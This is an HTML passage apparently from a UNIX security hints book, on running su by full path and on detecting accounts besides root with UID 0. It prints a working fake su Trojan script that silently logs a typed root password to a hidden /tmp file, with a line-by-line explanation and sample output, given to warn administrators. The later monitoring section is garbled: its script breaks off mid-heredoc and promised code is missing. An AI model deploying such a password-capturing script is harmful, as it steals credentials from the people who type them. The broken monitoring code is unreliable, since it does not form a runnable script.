<h3><a name="Heading4"></A><font color="#000077">3.2 The Full Path to Superuser</FONT></H3>
<h4 align="LEFT"><a name="Heading5"></A><font color="#000077">3.2.1 Description</FONT></H4>
<p>Discusses using the full path to be superuser. Do not execute <small>su</SMALL> by itself. The <small>su</SMALL> command resides in the /bin directory. When you type the command without its entire path, you risk the chance of executing some nonsystem <small>su</SMALL> program that might be a Trojan horse residing in a directory other than /bin. You have to be cautious and aware of your environment variable setting for <small>PATH</SMALL>. When you type the command <small>su</SMALL>, your shell searches for the executable program in the order that the directories are listed in your <small>PATH</SMALL> variable. If there is an <small>su</SMALL> command in /usr/local/bin that is executed before /bin, the nonsystem <small>su</SMALL> command in /usr/local/bin is executed. You could run this program and not even know it.</P>
<p><font size="+1"><b>Example</B></FONT></P>
<p>Flavors: all
</P>
<p>Syntax:</P>
<!-- CODE SNIP //-->
<pre>
<b>/bin/su</B> [ <b>-</B> ] <i>name</I>
</PRE>
<!-- END CODE SNIP //-->
<p>Accessing the superuser root account can be done in various ways. One of the safest is from the local console, defining the entire path to the command.
</P>
<p>This is the wrong way:</P>
<!-- CODE SNIP //-->
<pre>
$ su
</PRE>
<!-- END CODE SNIP //-->
<p>This is also wrong:
</P>
<!-- CODE SNIP //-->
<pre>
$ su root
</PRE>
<!-- END CODE SNIP //-->
<p>This is the right way:
</P>
<!-- CODE SNIP //-->
<pre>
$ /bin/su
</PRE>
<!-- END CODE SNIP //-->
<p>This is also correct:
</P>
<!-- CODE SNIP //-->
<pre>
$ /bin/su root
</PRE>
<!-- END CODE SNIP //-->
<p><font size="+1"><b>Reason</B></FONT></P>
<p>You should really get into the habit of typing the entire path for security reasons. An easy way to obtain root is to get access for someone with root to run a different version of <small>su</SMALL>.</P>
<p><font size="+1"><b>Real World Experience</B></FONT></P>
<p>Here is an example of a hack that has been performed in the past. I&#146;m not saying I did it, but it does work. A user wants root access on a computer other than his own. He knows that /usr/local/bin is cross-mounted from many servers to the central fileserver. He had root access on his UNIX workstation but not on the system he was targeting. Although none of the systems was trusted by one another at the root level, the fileserver was exporting root&#146;s permissions to his computer via NFS. Some administrators actually have been known to have /usr/local/bin at the beginning of their path, before /bin.
</P>
<!-- CODE SNIP //-->
<pre>
path    (/usr/sbin /usr/bsd /sbin /usr/bin /usr/local
&#8658;/bin /bin /etc /usr/etc /usr/bin/X11)
</PRE>
<!-- END CODE SNIP //-->
<p>The following similar script appeared in the /usr/local/bin and had a filename of su:
</P>
<!-- CODE //-->
<pre>
#! /bin/sh

stty -echo

echo -n &#147;Password:&#148;
read PASSWD

stty echo
echo
echo &#147;Sorry&#148;

echo &#147;$1 / $2: $PASSWD&#148; &gt&gt /tmp/.Text33s5
</PRE>
<!-- END CODE //-->
<p>Line 1: Define the shell being used.
</P>
<p>Line 3: Turn off the echoing of characters to STDOUT.</P>
<p>Line 4: Simulate a login session by asking for a password.</P>
<p>Line 5: Read the typed password into the variable <small>$PASSWD</SMALL>.</P>
<p>Line 7: Turn the echoing back on so characters are sent to STDOUT.</P>
<p>Line 10: Simulate a wrong password being entered.</P>
<p>Line 12: Write the root account name (if specified) and the password entered to an inconspicuous filename.</P>
<p>The output then appears as if the administrator were attempting to switch to the root account and become superuser.</P>
<!-- CODE SNIP //-->
<pre>
$ su root
Password:
Sorry
$

$ cat /tmp/.Text33s5

root / secretpasswd
</PRE>
<!-- END CODE SNIP //-->
<p>Believe it or not, it works! If your password doesn&#146;t work using the <small>su</SMALL> command but works when you log in at the initial console login prompt, change your password immediately! It is crude and simple: Don&#146;t get your root password hacked by a simple script; use the full path to /bin/su.</P>

<h3><a name="Heading6"></A><font color="#000077">3.3 Monitoring root in the Password File</FONT></H3>
<h4 align="LEFT"><a name="Heading7"></A><font color="#000077">3.3.1 Description</FONT></H4>
<p>Verify that there are no new accounts with root&#146;s UID.

<p>Flavors: AT&ampT, BSD
</P>
<p>Shells: sh, ksh</P>
<p>One way that root has been compromised in the past is by setting a normal user&#146;s account to have a UID of <small>0</SMALL>. If a normal user has a UID of <small>0</SMALL>, they have all rights and privileges that root has. Only root should have a UID of <small>0</SMALL>, unless you are implementing hint 3.1, &#147;Delegating root to Multiple Admins.&#148;</P>
<p>Here is a simple script that scans through the password file searching for any UID <small>0</SMALL> that does not belong to root. If one is found, an email is sent out to the administrator responsible for that system.</P>
<!-- CODE //-->
<pre>
#! /bin/sh

for id in &#145;awk &#145;FS=&#147;:&#148; {if(($3 == 0 &amp&amp $1 != &#147;root&#148; )) \
print $1}&#146; /etc/passwd&#146;
do
  mail -s &#147;Root Access Alert&#148; root@rocket.foo.com &lt&lt EOF

<p>This is a very unobtrusive script that can be set up in the crontab to run half-hourly, hourly, or daily, depending on your environment. An hourly crontab entry set to run at 15 minutes past every hour would look like this:

<p>If there are multiple root accounts as described in hint 3.1, a modification to the first line of the script would look like this:

&#8658;!= &#147;root-xx&#148; )) \
print $1}&#146; /etc/passwd&#146;

<p>If you want to display the findings to the console at /dev/console, change the command line that sends the mail out to the administrator from

<!-- CODE SNIP //-->
<pre>
mail -s &#147;Root Access Alert&#148; root@rocket.foo.com &lt&lt EOF

<p><font size="+1"><b>Reason</B></FONT></P>
<p>Monitoring root is part of the paranoia that an administrator must face if she wants to maintain a secure site. In many cases, those administrators who are not monitoring the password file or root are most likely setting themselves up to fail the security audits that parent companies often do in large installations.
